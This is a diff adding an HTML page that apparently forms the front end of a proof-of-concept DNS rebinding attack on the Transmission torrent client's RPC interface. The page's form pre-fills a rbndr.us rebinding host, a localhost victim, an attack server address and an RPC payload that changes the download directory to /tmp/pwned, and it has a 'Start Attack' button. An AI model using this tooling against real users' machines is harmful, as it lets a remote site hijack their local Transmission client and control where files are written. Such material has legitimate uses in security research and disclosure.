@@ -1,0 +1,48 @@
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>DNS Rebinding</title>
+	<script src="./js/index.js"></script>
+</head>
+
+<body>
+<h3>Transmission DNS Rebinding Testcase</h3>
+<table>
+<tbody><tr>
+    <td>Rebinding Host URL</td>
+    <td>
+        <input id="hosturl" value="http://%1.%2.rbndr.us:9091/transmission/iframe.html" size="64">
+    </td>
+</tr>
+<tr>
+    <td>Rebinding Host A (Transmission Server, usually 127.0.0.1 but RFC1918 works)</td>
+    <td>
+        <input id="hostA" value="127.0.0.1" size="64">
+    </td>
+</tr>
+<tr>
+    <td>Rebinding Host B (Attack Server)</td>
+    <td>
+        <input id="hostB" value="192.168.0.78" size="64">
+    </td>
+</tr>
+<tr>
+    <td>How long to wait between attempts (seconds, 20 works best for chrome)</td>
+    <td>
+        <input id="interval" value="20" size="64">
+    </td>
+</tr>
+<tr>
+    <td>Command to run on success</td>
+    <td>
+        <input id="rpc" value="{&quot;method&quot;:&quot;session-set&quot;,&quot;arguments&quot;:{&quot;download-dir&quot;:&quot;/tmp/pwned&quot;}}" size="64">
+    </td>
+</tr>
+</tbody></table>
+<p>
+<input onclick="begin()" id="start" type="submit" value="Start Attack">&nbsp;
+</p>
+
+<iframe id="attack" src="about:blank" height="128" width="50%" data-ss1519169828="1" kwframeid="1"></iframe>
+</body>
+</html>
